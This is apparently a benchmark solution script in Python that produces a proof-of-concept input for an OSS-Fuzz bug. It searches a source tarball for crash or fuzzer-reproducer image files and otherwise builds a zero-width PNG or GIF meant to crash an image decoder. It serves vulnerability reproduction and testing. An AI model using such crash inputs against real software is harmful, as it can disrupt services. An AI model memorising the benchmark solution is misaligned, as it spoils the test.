import os
import tarfile
import binascii
import zlib


class Solution:
    def solve(self, src_path: str) -> bytes:
        data = self._find_embedded_poc(src_path)
        if data is not None and len(data) > 0:
            return data
        return self._generate_fallback_poc(src_path)

    def _find_embedded_poc(self, src_path: str):
        bugid = "42536679"
        patterns_priority = [
            bugid,
            "oss-fuzz",
            "ossfuzz",
            "clusterfuzz",
            "crash",
            "poc",
            "zero_width",
            "zerowidth",
            "zero-height",
            "zeroheight",
            "zerodim",
            "zero-dim",
            "zero_dimension",
            "zerodimension",
            "minimized",
        ]
        image_exts = (
            ".png",
            ".apng",
            ".gif",
            ".jpg",
            ".jpeg",
            ".webp",
            ".bmp",
            ".ico",
            ".tif",
            ".tiff",
            ".jxl",
            ".psd",
            ".heic",
            ".avif",
            ".svg",
            ".bin",
            ".dat",
            ".raw",
            ".pgx",
            ".pnm",
            ".ppm",
            ".pgm",
            ".pbm",
            ".cur",
            ".ani",
            ".dds",
            ".tga",
        )

        try:
            with tarfile.open(src_path, "r:*") as tar:
                members = [m for m in tar.getmembers() if m.isfile()]
                # Build candidate list with a score for filename matching
                scored_members = []
                for m in members:
                    name_lower = m.name.lower()
                    score = 0
                    for i, pat in enumerate(patterns_priority):
                        if pat in name_lower:
                            # Higher priority patterns get higher base score
                            score += (len(patterns_priority) - i) * 10
                    if any(name_lower.endswith(ext) for ext in image_exts):
                        score += 5
                    if score > 0 and m.size > 0 and m.size <= 2 * 1024 * 1024:
                        scored_members.append((score, -m.size, m))

                # Sort by score (desc), then by size (prefer slightly smaller)
                scored_members.sort(reverse=True, key=lambda x: (x[0], x[1]))

                for _, _, m in scored_members:
                    f = tar.extractfile(m)
                    if not f:
                        continue
                    data = f.read()
                    if not data:
                        continue
                    fmt, w, h = self._extract_image_info(data)
                    if fmt is None:
                        # Not a recognized image; skip
                        continue
                    # Prefer images with zero width or height
                    if w == 0 or h == 0:
                        return data

                # If no zero-dimension image found, return first recognized image
                for _, _, m in scored_members:
                    f = tar.extractfile(m)
                    if not f:
                        continue
                    data = f.read()
                    if not data:
                        continue
                    fmt, _, _ = self._extract_image_info(data)
                    if fmt is not None:
                        return data
        except tarfile.TarError:
            pass
        return None

    def _extract_image_info(self, data: bytes):
        if len(data) >= 24 and data.startswith(b"\x89PNG\r\n\x1a\n"):
            w = int.from_bytes(data[16:20], "big")
            h = int.from_bytes(data[20:24], "big")
            return "PNG", w, h
        if len(data) >= 10 and (data.startswith(b"GIF87a") or data.startswith(b"GIF89a")):
            w = int.from_bytes(data[6:8], "little")
            h = int.from_bytes(data[8:10], "little")
            return "GIF", w, h
        if len(data) >= 2 and data[0:2] == b"\xff\xd8":
            return "JPEG", None, None
        if len(data) >= 12 and data[0:4] == b"RIFF" and data[8:12] == b"WEBP":
            return "WEBP", None, None
        if len(data) >= 2 and data[0:2] == b"BM":
            return "BMP", None, None
        if len(data) >= 4 and (data[0:4] == b"\x0aJXL" or data[0:4] == b"JXL "):
            return "JXL", None, None
        if len(data) >= 4 and (data[0:4] == b"II*\x00" or data[0:4] == b"MM\x00*"):
            return "TIFF", None, None
        return None, None, None

    def _generate_fallback_poc(self, src_path: str) -> bytes:
        fmt = self._detect_format_from_sources(src_path)
        if fmt == "GIF":
            return self._build_zero_dim_gif()
        # Default and common case
        return self._build_zero_dim_png()

    def _detect_format_from_sources(self, src_path: str) -> str:
        scores = {
            "PNG": 0,
            "GIF": 0,
            "JPEG": 0,
            "WEBP": 0,
            "BMP": 0,
            "TIFF": 0,
            "JXL": 0,
        }
        keywords = {
            "PNG": [
                "libpng",
                "png_",
                "png.h",
                "ihdr",
                "png signature",
                "png_set",
            ],
            "GIF": ["giflib", "gif_", "gif87a", "gif89a", "giffiletype"],
            "JPEG": ["libjpeg", "jpeglib.h", "jpeg_", "jfif", "dct"],
            "WEBP": ["libwebp", "webp_", "vp8x", "riff", "webpdecoder"],
            "BMP": ["bmp_", "bitmapfileheader", "bmp.h", "windows bmp"],
            "TIFF": ["libtiff", "tiff_", "tifftag", "tiff.h"],
            "JXL": ["libjxl", "jpeg xl", "jxl_", "jxlc", "jxl_dec"],
        }
        try:
            with tarfile.open(src_path, "r:*") as tar:
                for m in tar.getmembers():
                    if not m.isfile():
                        continue
                    name_lower = m.name.lower()
                    if not name_lower.endswith(
                        (".c", ".cc", ".cpp", ".h", ".hpp", ".hh", ".txt", ".md")
                    ):
                        continue
                    if m.size > 512 * 1024:
                        continue
                    f = tar.extractfile(m)
                    if not f:
                        continue
                    try:
                        content = f.read(16384).decode("utf-8", errors="ignore").lower()
                    except Exception:
                        continue
                    for fmt, kws in keywords.items():
                        for kw in kws:
                            if kw in content:
                                scores[fmt] += 1
                # Choose format with highest score, default to PNG
                best_fmt = "PNG"
                best_score = -1
                for fmt, sc in scores.items():
                    if sc > best_score:
                        best_score = sc
                        best_fmt = fmt
                return best_fmt
        except tarfile.TarError:
            return "PNG"

    def _build_zero_dim_png(self) -> bytes:
        sig = b"\x89PNG\r\n\x1a\n"
        width = 0
        height = 1
        ihdr_data = (
            width.to_bytes(4, "big")
            + height.to_bytes(4, "big")
            + b"\x08"  # bit depth
            + b"\x02"  # color type: truecolor
            + b"\x00"  # compression method
            + b"\x00"  # filter method
            + b"\x00"  # interlace method
        )
        ihdr_chunk = self._png_chunk(b"IHDR", ihdr_data)
        raw_data = b"\x00"
        compressed = zlib.compress(raw_data)
        idat_chunk = self._png_chunk(b"IDAT", compressed)
        iend_chunk = self._png_chunk(b"IEND", b"")
        return sig + ihdr_chunk + idat_chunk + iend_chunk

    def _png_chunk(self, ctype: bytes, data: bytes) -> bytes:
        length = len(data).to_bytes(4, "big")
        crc = binascii.crc32(ctype + data) & 0xFFFFFFFF
        crc_bytes = crc.to_bytes(4, "big")
        return length + ctype + data + crc_bytes

    def _build_zero_dim_gif(self) -> bytes:
        header = b"GIF89a"
        canvas_width = 0
        canvas_height = 1
        width_bytes = canvas_width.to_bytes(2, "little")
        height_bytes = canvas_height.to_bytes(2, "little")
        packed = bytes([0xF0])  # GCT flag set, 8-bit color resolution
        bg_color_index = b"\x00"
        pixel_aspect_ratio = b"\x00"
        lsd = width_bytes + height_bytes + packed + bg_color_index + pixel_aspect_ratio
        gct = b"\x00\x00\x00\xff\xff\xff"
        image_separator = b"\x2C"
        left = b"\x00\x00"
        top = b"\x00\x00"
        img_width = (0).to_bytes(2, "little")
        img_height = (0).to_bytes(2, "little")
        img_packed = b"\x00"
        image_descriptor = image_separator + left + top + img_width + img_height + img_packed
        lzw_min_code_size = b"\x02"
        sub_block_size = b"\x01"
        sub_block_data = b"\x00"
        terminator = b"\x00"
        image_data = lzw_min_code_size + sub_block_size + sub_block_data + terminator
        trailer = b"\x3B"
        return header + lsd + gct + image_descriptor + image_data + trailer
